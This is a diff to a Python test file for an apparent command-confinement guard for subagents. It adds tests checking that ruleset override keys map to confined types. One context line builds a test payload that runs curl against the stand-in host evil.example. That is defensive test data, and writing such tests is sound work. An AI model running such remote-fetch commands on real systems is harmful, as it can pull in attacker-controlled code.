@@ -659,3 +659,51 @@ def test_executor_no_longer_denied_by_this_guard(monkeypatch):
     _confine(monkeypatch)
     payload = _payload("curl https://evil.example/x")
     assert guard.check(payload) is None
+
+
+# ---------------------------------------------------------------------------
+# Structural pin (this plan's C1): every key in
+# ``_DEFAULT_RULESET_TYPE_OVERRIDES`` must be a type ``_is_confined_type``
+# actually confines under the CURRENT, hermetic policy this guard resolves at
+# runtime -- never DoE's ``subagent-sandbox-policy.yaml`` directly, which is
+# non-hermetic (lives in a sibling repo, unresolvable in a cloud container).
+# This is the pin that would have caught Divergence 9 going stale: an
+# override entry surviving the type it was written for being removed from
+# confinement, silently testing a state production cannot reach.
+# ---------------------------------------------------------------------------
+
+
+def test_ruleset_override_keys_are_confined_types(monkeypatch):
+    """Every ``_DEFAULT_RULESET_TYPE_OVERRIDES`` key must be confined by
+    ``_is_confined_type`` against this module's own live policy resolution
+    (``_helpers._CONFINED_FINDINGS_AGENTS`` plus the ``bash_policy:``
+    fallback path the guard actually consults) -- an unconfined key's
+    ruleset entry is unreachable dead data, exactly what Divergence 9 left
+    behind."""
+    policy = guard.load_policy(None)
+    for key in guard._DEFAULT_RULESET_TYPE_OVERRIDES:
+        assert guard._is_confined_type(key, policy), (
+            f"{key!r} has a _DEFAULT_RULESET_TYPE_OVERRIDES entry but "
+            "_is_confined_type does not confine it -- this ruleset override "
+            "is dead data unreachable from _default_ruleset."
+        )
+
+
+def test_ruleset_override_keys_pin_reports_red_on_a_planted_unconfined_key(monkeypatch):
+    """Self-test for the pin above: an unconfined key inserted into a COPY of
+    ``_DEFAULT_RULESET_TYPE_OVERRIDES`` must fail the same assertion, proving
+    the pin can actually report red rather than passing vacuously.
+
+    Leg 3 (``is_confined_by_roster_absence``) is pinned to ``False`` so this
+    self-test does not depend on real roster/DoE-checkout resolution being
+    available in this process -- the planted key must be unconfined on its
+    own terms (legs 1/2), not merely because the roster could not be read.
+    """
+    monkeypatch.setattr(guard, "is_confined_by_roster_absence", lambda t: False)
+    policy = guard.load_policy(None)
+    planted = dict(guard._DEFAULT_RULESET_TYPE_OVERRIDES)
+    planted["coordinator:not-a-confined-type"] = {"interpreter_allow_scripts": True}
+    violations = [
+        key for key in planted if not guard._is_confined_type(key, policy)
+    ]
+    assert violations == ["coordinator:not-a-confined-type"]
